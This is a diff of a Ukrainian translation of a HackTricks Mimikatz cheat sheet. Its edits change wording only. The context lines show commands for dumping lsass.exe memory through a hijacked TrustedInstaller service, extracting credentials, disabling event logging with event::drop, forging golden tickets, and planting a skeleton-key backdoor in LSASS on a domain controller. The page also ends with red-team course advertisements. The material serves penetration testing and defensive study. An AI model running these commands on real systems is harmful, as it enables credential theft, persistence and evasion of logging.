@@ -22,7 +22,7 @@ Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and 
 {% embed url="https://academy.8ksec.io/" %}
 
 
-**Ця сторінка базується на одній з [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Перевірте оригінал для отримання додаткової інформації!
+**Ця сторінка основана на одній з [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Перевірте оригінал для отримання додаткової інформації!
 
 ## LM та відкритий текст в пам'яті
 
@@ -34,7 +34,7 @@ Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and 
 1. Модифікацію реєстру в _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, встановивши `RunAsPPL` на `dword:00000001`.
 2. Впровадження об'єкта групової політики (GPO), який забезпечує цю зміну реєстру на керованих пристроях.
 
-Незважаючи на ці заходи, такі інструменти, як Mimikatz, можуть обійти захист LSA, використовуючи специфічні драйвери, хоча такі дії, ймовірно, будуть зафіксовані в журналах подій.
+Незважаючи на ці заходи, інструменти, такі як Mimikatz, можуть обійти захист LSA, використовуючи специфічні драйвери, хоча такі дії, ймовірно, будуть зафіксовані в журналах подій.
 
 ### Протидія видаленню SeDebugPrivilege
 
@@ -43,7 +43,7 @@ Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and 
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Це дозволяє вивантажити пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
+Це дозволяє скинути пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -61,7 +61,7 @@ sc start TrustedInstaller
 #### Experimental Feature: Patching the Event Service
 
 - **Command**: `event::drop`
-- Ця експериментальна команда призначена для зміни поведінки служби реєстрації подій, ефективно запобігаючи їй реєструвати нові події.
+- Ця експериментальна команда призначена для зміни поведінки служби реєстрації подій, ефективно запобігаючи її реєстрації нових подій.
 - Example: `mimikatz "privilege::debug" "event::drop" exit`
 
 - Команда `privilege::debug` забезпечує, щоб Mimikatz працював з необхідними привілеями для зміни системних служб.
@@ -72,13 +72,13 @@ sc start TrustedInstaller
 
 ### Golden Ticket Creation
 
-Золотий квиток дозволяє для доступу до домену під виглядом іншого користувача. Ключова команда та параметри:
+Золотий квиток дозволяє для доменної ідентифікації доступу. Ключова команда та параметри:
 
 - Command: `kerberos::golden`
 - Parameters:
 - `/domain`: Ім'я домену.
 - `/sid`: Ідентифікатор безпеки (SID) домену.
-- `/user`: Ім'я користувача, під виглядом якого потрібно діяти.
+- `/user`: Ім'я користувача для ідентифікації.
 - `/krbtgt`: NTLM хеш облікового запису служби KDC домену.
 - `/ptt`: Безпосередньо впроваджує квиток у пам'ять.
 - `/ticket`: Зберігає квиток для подальшого використання.
@@ -165,12 +165,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Різне
 
-- **MISC::Skeleton**: Впровадити бекдор в LSASS на DC.
+- **MISC::Skeleton**: Впровадити бекдор у LSASS на DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Підвищення привілеїв
 
-- **PRIVILEGE::Backup**: Отримати права на резервне копіювання.
+- **PRIVILEGE::Backup**: Отримати права резервного копіювання.
 - `mimikatz "privilege::backup" exit`
 
 - **PRIVILEGE::Debug**: Отримати привілеї налагодження.
@@ -193,9 +193,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **TOKEN::Elevate**: Імітувати токени.
 - `mimikatz "token::elevate /domainadmin" exit`
 
-### Терминальні служби
+### Служби терміналів
 
-- **TS::MultiRDP**: Дозволити кілька RDP сесій.
+- **TS::MultiRDP**: Дозволити кілька RDP-сесій.
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions**: Перерахувати сесії TS/RDP.
@@ -214,8 +214,8 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 {% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
-Вчіться та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вчіться та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
